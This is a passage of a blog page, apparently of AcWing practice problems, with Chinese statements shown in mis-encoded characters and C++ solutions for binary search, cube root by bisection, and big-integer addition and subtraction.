å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>ï¼Œè¡¨ç¤ºæ•°ç»„é•¿åº¦å’Œè¯¢é—®ä¸ªæ•°ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼ˆå‡åœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>âˆ¼</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">1 \sim 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span> èŒƒå›´å†…ï¼‰ï¼Œè¡¨ç¤ºå®Œæ•´æ•°ç»„ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸€ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>ï¼Œè¡¨ç¤ºä¸€ä¸ªè¯¢é—®å…ƒç´ ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…± <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ‰€æ±‚å…ƒç´ çš„èµ·å§‹ä½ç½®å’Œç»ˆæ­¢ä½ç½®ã€‚</p><p>å¦‚æœæ•°ç»„ä¸­ä¸å­˜åœ¨è¯¥å…ƒç´ ï¼Œåˆ™è¿”å› <code>-1 -1</code>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>q</mi><mo>â‰¤</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">1 \le q \le 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>k</mi><mo>â‰¤</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">1 \le k \le 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>6 31 2 2 3 3 4345</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>3 45 5-1 -1</code></pre><h3 id="é¢˜è§£-5">é¢˜è§£</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, q;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;q);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  <span class="keyword">while</span> (q--) &#123;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;k);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (a[mid] &gt;= k) &#123;</span><br><span class="line">        r = mid;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        l = mid + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (a[l] != k) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;-1 -1\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, l);</span><br><span class="line">      l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="type">int</span> mid = (l + r + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (a[mid] &lt;= k) &#123;</span><br><span class="line">          l = mid;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          r = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, l);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-790-æ•°çš„ä¸‰æ¬¡æ–¹æ ¹"><a href="https://www.acwing.com/problem/content/792/">AcWing 790. æ•°çš„ä¸‰æ¬¡æ–¹æ ¹</a></h2><p>ç»™å®šä¸€ä¸ªæµ®ç‚¹æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ï¼Œæ±‚å®ƒçš„ä¸‰æ¬¡æ–¹æ ¹ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>å…±ä¸€è¡Œï¼ŒåŒ…å«ä¸€ä¸ªæµ®ç‚¹æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…±ä¸€è¡Œï¼ŒåŒ…å«ä¸€ä¸ªæµ®ç‚¹æ•°ï¼Œè¡¨ç¤ºé—®é¢˜çš„è§£ã€‚</p><p>æ³¨æ„ï¼Œç»“æœä¿ç•™ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6</mn></mrow><annotation encoding="application/x-tex">6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span></span></span></span> ä½å°æ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>10000</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">-10000 \le n \le 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">10000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>1000.00</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>10.000000</code></pre><h3 id="é¢˜è§£-6">é¢˜è§£</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">double</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;n);  <span class="comment">// å¿…é¡».lf</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">double</span> l = <span class="number">-100</span>, r = <span class="number">100</span>;  <span class="comment">// double</span></span><br><span class="line">  <span class="comment">// ä¿ç•™nä½å°æ•°ï¼Œä¸€èˆ¬åŒºé—´å®½åº¦å°±å°äº1e-(n+2)</span></span><br><span class="line">  <span class="keyword">while</span> (r - l &gt; <span class="number">1e-8</span>) &#123;</span><br><span class="line">    <span class="type">double</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (mid * mid * mid &gt;= n) &#123;</span><br><span class="line">      r = mid;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      l = mid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%.6lf\n&quot;</span>, l);  <span class="comment">// .6fæˆ–.6lféƒ½è¡Œ</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="é«˜ç²¾åº¦">é«˜ç²¾åº¦</h1><h2 id="AcWing-791-é«˜ç²¾åº¦åŠ æ³•"><a href="https://www.acwing.com/problem/content/793/">AcWing 791. é«˜ç²¾åº¦åŠ æ³•</a></h2><p>ç»™å®šä¸¤ä¸ªæ­£æ•´æ•°ï¼ˆä¸å«å‰å¯¼ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ï¼‰ï¼Œè®¡ç®—å®ƒä»¬çš„å’Œã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>å…±ä¸¤è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸€ä¸ªæ•´æ•°ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…±ä¸€è¡Œï¼ŒåŒ…å«æ‰€æ±‚çš„å’Œã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mtext>æ•´æ•°é•¿åº¦</mtext><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le æ•´æ•°é•¿åº¦ \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">æ•´æ•°é•¿åº¦</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>1223</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>35</code></pre><h3 id="é«˜ç²¾åº¦åŠ æ³•">é«˜ç²¾åº¦åŠ æ³•</h3><blockquote><p><strong>C++ä¸­å¯¹äºstringä¸èƒ½ä½¿ç”¨ <code>scanf(&quot;%s&quot;, a)</code> è¯»å–</strong>ï¼Œå»ºè®®ä½¿ç”¨ <code>cin</code> è¯»å–æˆ–è€…ä½¿ç”¨Cä¸­ <code>char []</code> è¿›è¡Œæ›¿ä»£ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">add</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, vector&lt;<span class="type">int</span>&gt; &amp;B)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (A.<span class="built_in">size</span>() &lt; B.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="built_in">add</span>(B, A);</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">  <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    t += A[i];</span><br><span class="line">    <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) t += B[i];</span><br><span class="line">    C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">    t /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (t) C.<span class="built_in">push_back</span>(t);</span><br><span class="line">  <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  string a, b;</span><br><span class="line">  cin &gt;&gt; a &gt;&gt; b;  <span class="comment">// a = &quot;12345&quot;</span></span><br><span class="line">  </span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; A, B;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);  <span class="comment">// A = [5, 4, 3, 2, 1]</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C = <span class="built_in">add</span>(A, B);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-792-é«˜ç²¾åº¦å‡æ³•"><a href="https://www.acwing.com/problem/content/794/">AcWing 792. é«˜ç²¾åº¦å‡æ³•</a></h2><p>ç»™å®šä¸¤ä¸ªæ­£æ•´æ•°ï¼ˆä¸å«å‰å¯¼ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ï¼‰ï¼Œè®¡ç®—å®ƒä»¬çš„å·®ï¼Œè®¡ç®—ç»“æœå¯èƒ½ä¸ºè´Ÿæ•°ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>å…±ä¸¤è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸€ä¸ªæ•´æ•°ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…±ä¸€è¡Œï¼ŒåŒ…å«æ‰€æ±‚çš„å·®ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mtext>æ•´æ•°é•¿åº¦</mtext><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1 \le æ•´æ•°é•¿åº¦ \le 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">æ•´æ•°é•¿åº¦</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>3211</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>21</code></pre><h3 id="é«˜ç²¾åº¦å‡æ³•">é«˜ç²¾åº¦å‡æ³•</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, vector&lt;<span class="type">int</span>&gt; &amp;B)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (A.<span class="built_in">size</span>() != B.<span class="built_in">size</span>()) <span class="keyword">return</span> A.<span class="built_in">size</span>() &gt; B.<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="keyword">if</span> (A[i] != B[i]) <span class="keyword">return</span> A[i] &gt; B[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sub</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, vector&lt;<span class="type">int</span>&gt; &amp;B)</span> </span>&#123;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">  <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i++) &#123;  <span class="comment">// ä»ä½åˆ°é«˜</span></span><br><span class="line">    t = A[i] - t;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) t -= B[i];</span><br><span class="line">    C.<span class="built_in">push_back</span>((t + <span class="number">10</span>) % <span class="number">10</span>);</span><br><span class="line">    t = (t &lt; <span class="number">0</span>) ? <span class="number">1</span>: <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();  <span class="comment">// &gt;1, è€Œé&gt;0</span></span><br><span class="line">  <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  string a, b;</span><br><span class="line">  cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; A, B;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">cmp</span>(A, B)) &#123;</span><br><span class="line">    C = <span class="built_in">sub</span>(A, B);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">    C = <span class="built_in">sub</span>(B, A);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 